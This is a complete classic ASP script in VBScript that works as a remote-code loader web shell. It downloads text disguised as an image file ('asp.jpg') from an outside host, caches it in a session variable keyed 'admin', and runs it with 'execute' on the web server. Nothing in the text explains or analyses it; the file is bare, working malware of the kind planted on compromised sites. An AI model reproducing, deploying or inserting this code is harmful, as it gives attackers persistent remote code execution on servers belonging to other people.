<%@ LANGUAGE = VBScript.encode%><%
UserPass="admin"  
function Gset() 
if Session(UserPass)="" then 
Set o = CreateObject("MSXML2.XMLHTTP")
o.open "GET", "http://sss1.freevar.com/asp.jpg", False
o.send
Gset=o.responseText
else
Gset=Session(UserPass)
End if
End function
execute Gset()
%>
